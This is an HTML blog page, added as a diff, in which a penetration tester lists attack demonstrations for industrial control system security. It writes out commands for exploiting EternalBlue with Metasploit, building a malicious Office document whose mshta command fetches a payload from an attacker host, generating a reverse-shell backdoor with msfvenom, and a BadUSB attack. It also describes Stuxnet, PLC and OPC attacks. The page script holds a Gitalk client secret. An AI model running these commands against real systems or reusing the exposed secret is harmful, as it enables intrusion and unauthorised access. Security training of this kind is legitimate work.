@@ -1,0 +1,330 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>工控安全——攻防演示案例 | KEYONE——三年级小学生</title>
+<meta name="description" content="PenTesting&amp;Security Research &lt;br&gt;
+LOVE &amp; PEACE ❤️JUST FOR FUN">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://hi-kk.github.io//favicon.ico?v=1568020129843">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://hi-kk.github.io//styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://hi-kk.github.io/">
+        <img class="avatar" src="https://hi-kk.github.io//images/avatar.png?v=1568020129843" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://hi-kk.github.io/">
+        <h1 class="site-title">KEYONE——三年级小学生</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://hi-kk.github.io//post-images/89QQGqE.png')">
+            </div>
+          
+          <h2 class="post-title">工控安全——攻防演示案例</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2019-09-09</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://hi-kk.github.io//tag/R3D6Rg0VJ">
+                    攻击
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://hi-kk.github.io//tag/6rZMKBuua">
+                    实验
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://hi-kk.github.io//tag/G7QS4bExG">
+                    工控安全
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://hi-kk.github.io//tag/K_FPj1WAl">
+                    漏洞
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://hi-kk.github.io//tag/nfMLnOATe">
+                    分享
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>列举一些可以在工控安全项目中用的攻防演示案例，持续更新......</p>
+<!-- more -->
+<h2 id="前言">前言</h2>
+<p>在某核电的安全项目中，感谢公司leader信任让我负责项目的总体方案设计、攻防案例设计、安全防护等方案，经过前期大量的搜索、复现、思考、选取，顺利完成该项目的建设实施。于是，在此文中分享一些可以在工控安全项目中进行攻防演示的案例，以供大家参考。<br>
+<img src="https://hi-kk.github.io//post-images/1568005767519.png" alt=""></p>
+<h2 id="针对工控系统上位机操作系统攻防案例">针对工控系统上位机操作系统攻防案例</h2>
+<h3 id="漏洞一">漏洞一</h3>
+<p>MS17-010 （永恒之蓝Eternalblue）</p>
+<h4 id="漏洞描述">漏洞描述</h4>
+<p>永恒之蓝（Eternalblue）通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h4 id="漏洞影响">漏洞影响</h4>
+<p>目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012等。</p>
+<h4 id="演示步骤">演示步骤</h4>
+<p>1.使用nmap对目标进行扫描，确定目标存在永恒之蓝漏洞，执行如下命令<br>
+<code>nmap --script smb-vuln-ms17-010 192.168.28.128</code><br>
+2.使用Metasploit对目标进行攻击，执行如下操作<br>
+输入msfconsole启动Metasploit<br>
+在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞<br>
+<img src="https://hi-kk.github.io//post-images/1567999055423.png" alt=""><br>
+输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>选择漏洞利用模块<br>
+输入<code>show options</code>查看当前攻击配置<br>
+<img src="https://hi-kk.github.io//post-images/1567999084048.png" alt=""><br>
+将配置中第一行的<code>RHOST</code>修改为目标IP地址<br>
+配置完成后，输入<code>run</code>命令执行漏洞攻击，如果执行成功，会获得目标机器windows系统的shell终端，可对该目标机器执行任何命令<br>
+<img src="https://hi-kk.github.io//post-images/1567999098267.png" alt=""></p>
+<h2 id="针对工控系统上位机办公软件攻防案例">针对工控系统上位机办公软件攻防案例</h2>
+<h3 id="漏洞一-2">漏洞一：</h3>
+<p>CVE-2017-11882&amp;CVE-2018-0802 (Microsoft Office内存破坏漏洞)</p>
+<h4 id="漏洞描述-2">漏洞描述</h4>
+<p>在2017年11月14日，微软发布11月份安全补丁更新，其中更新了潜伏17年之久的Office远程代码执行漏洞(CVE-2017-11882) “噩梦公式一代“，而在2018年1月，又爆出了office 0day漏洞(CVE-2018-0802),该漏洞的技术原理类似17年修补的漏洞，是由于office公式编辑器组件EQNEDT32.EXE，对字体名的长度没有进行长度检验，导致攻击者可以通过构造恶意的字体名，执行任意代码。</p>
+<h4 id="漏洞影响-2">漏洞影响</h4>
+<ol>
+<li>Microsoft Office 2007 Service Pack 3</li>
+<li>Microsoft Office 2010 Service Pack 2</li>
+<li>Microsoft Office 2013 Service Pack 1</li>
+<li>Microsoft Office 2016</li>
+</ol>
+<h4 id="演示步骤-2">演示步骤</h4>
+<p>1.下载漏洞利用脚本备用<br>
+https://github.com/Ridter/RTF_11882_0802/blob/master/RTF_11882_0802.py<br>
+2.使用Metasploit生成攻击反向控制后门文件<br>
+<img src="https://hi-kk.github.io//post-images/1567999327764.png" alt=""><br>
+3.使用漏洞利用脚本，执行如下命令，生成包含漏洞的office文件<br>
+<code>python RTF_11882_0802.py -c &quot;mshta http://192.168.103.152:8080/123&quot; -o test.doc</code><br>
+4.将生成的test.doc文件，利用一些手段传给目标，当目标打开此文件时，会反弹出一个shell会话到攻击机，此时，攻击者已经控制了目标<br>
+<img src="https://hi-kk.github.io//post-images/1567999336471.png" alt=""></p>
+<h2 id="针对工控系统上位机usb外设攻防案例">针对工控系统上位机USB外设攻防案例</h2>
+<h3 id="攻击手法">攻击手法</h3>
+<p>badUSB<br>
+<img src="https://hi-kk.github.io//post-images/1567999635816.png" alt=""></p>
+<h4 id="原理简述">原理简述</h4>
+<p>BadUSB最早是在2014年的黑帽大会上研究人员JakobLell和Karsten Nohl提出并展示的。不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。<br>
+<img src="https://hi-kk.github.io//post-images/1567999651031.png" alt=""><br>
+从传统意义讲，当你在电脑中插入一张CD/DVD光盘，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过TEENSY，你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。<br>
+<img src="https://hi-kk.github.io//post-images/1567999686921.png" alt=""></p>
+<h4 id="演示步骤-3">演示步骤</h4>
+<p>1.攻击者事先制作好badUSB硬件设备，选择基于ATTINY85微控制器的USB开发板Digispark。<br>
+2.使用烧录代码的编译器Arduino IDE，将恶意代码烧录到BadUSB中。<br>
+<img src="https://hi-kk.github.io//post-images/1567999547755.png" alt=""><br>
+3.配置好相关参数，将开发板设为Digispark，编程器设为USBtinyISP，编写好代码后，就可以点击“上传”按钮，然后插入BadUSB设备，一款简易BadUSB就做好了。<br>
+4.使用Metasploit生成攻击反向控制后门文件，执行如下命令<br>
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=5555 -f exe &gt;shell.exe</code><br>
+5.在MSF服务端，开启监听，等待目标机器中后门反弹回shell<br>
+6.攻击者可诱使目标机器的使用者将特制的badusb设备插入目标设备，当目标机器被插上U盘后，即会自动执行内部控制代码，在目标设备上模拟键鼠进行操作，下载执行了后门文件，此时攻击者就获得了目标机器反弹的shell，控制了目标机器。</p>
+<h2 id="针对工控系统编程组态软件攻防案例">针对工控系统编程组态软件攻防案例</h2>
+<h3 id="攻击手法一">攻击手法一</h3>
+<p>Stuxnet（震网）</p>
+<h3 id="震网病毒简述">震网病毒简述</h3>
+<p><img src="https://hi-kk.github.io//post-images/1568006481557.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1568006603026.png" alt=""></p>
+<h3 id="震网传播方式">震网传播方式</h3>
+<p>Stuxnet 蠕虫的攻击目标是 SIMATIC WinCC 软件。后者主要用于工业控制系统的数据采集与监控，一般部署在专用的内部局域网中，并与外部互联网实行物理上的隔离。为了实现攻击，Stuxnet 蠕虫采取多种 手段进行渗透和传播，如图所示<br>
+<img src="https://hi-kk.github.io//post-images/1568006704848.png" alt=""><br>
+整体的传播思路是：首先感染外部主机;然后感染 U 盘，利用快捷方式文件解析漏洞，传播到内部网络;在内网中，通过快捷方式解析漏洞、RPC 远程执行漏洞、打印机后台程序服务漏洞，实现联网主机之间的传播;最后抵达安装了 WinCC 软件的主机，展开攻击。<br>
+一旦发现WinCC系统，就利用其中的两个漏洞展开攻击</p>
+<ol>
+<li>一个是WinCC系统中存在一个硬编码漏洞，保护访问数据库的默认用户名和密码，Stuxnet利用这一漏洞尝试访问该系统的SQL数据库</li>
+<li>另一个是WinCC需要使用的Step7工程中，在打开工程文件时，存在DLL加载策略上的缺陷，从而导致一种类似于“DLL预加载攻击”的利用方式。最终，Stuxnet通过替换Step7软件中的s7otbxdx.dll，实现对一些查询、读取函数的Hook。</li>
+</ol>
+<h2 id="针对工控系统scada系统攻防案例">针对工控系统SCADA系统攻防案例</h2>
+<h3 id="漏洞一-3">漏洞一</h3>
+<p>CVE-2017-16720</p>
+<h4 id="漏洞简述">漏洞简述</h4>
+<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
+通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
+<h4 id="演示步骤-4">演示步骤</h4>
+<p>参见博主之前发的文章<a href="https://hi-kk.github.io/post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong/">漏洞实验：Advantech WebAccess远程命令执行</a></p>
+<h2 id="针对工控系统plc攻防案例">针对工控系统PLC攻防案例</h2>
+<h3 id="攻击手法一-2">攻击手法一</h3>
+<p>针对西门子S7协议或罗克韦尔AB Ethernet/IP、施耐德Modbus等工控协议，攻击者通过对主流工控协议的深度分析，向PLC设备发送远程停机、程序上传下载等控制指令数据报文，实现对下位机PLC的非法控制。</p>
+<h4 id="演示步骤-5">演示步骤</h4>
+<p>参见博主之前发的文章<a href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">工控安全：S7-1200 PLC远程启停攻击实验</a></p>
+<h2 id="针对工控系统opc数据通信攻防案例">针对工控系统OPC数据通信攻防案例</h2>
+<h3 id="攻击手法一-3">攻击手法一</h3>
+<p>利用OPC协议漏洞，在通过OPC服务器与MES服务器进行数据通信过程中，攻击者可以伪装成合法的OPC Client对工控系统数据进行读写。<br>
+<img src="https://hi-kk.github.io//post-images/1568008182432.png" alt=""></p>
+<h2 id="持续更新">持续更新......</h2>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan">
+              <h3 class="post-title">
+                下一篇：CentOS下安装KVM环境及VMWare与KVM互相转换
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+        
+          <div id="gitalk-container"></div>
+        
+
+        
+      
+
+      <div class="site-footer">
+  <div class="slogan">PenTesting&Security Research <br>
+LOVE & PEACE ❤️JUST FOR FUN</div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/hi-KK" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+    
+      
+        <a href="https://weibo.com/M0L0K" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+        <a href="https://www.zhihu.com/people/soulk/" target="_blank">
+          <i class="fab fa-zhihu"></i>
+        </a>
+      
+    
+      
+    
+  </div>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://hi-kk.github.io//atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'ad403fd7697bade5a7db',
+        clientSecret: '79897ccf8604c3b962eb063a6eb25f322126ff91',
+        repo: 'hi-kk.github.io',
+        owner: 'hi-KK',
+        admin: ['hi-KK'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
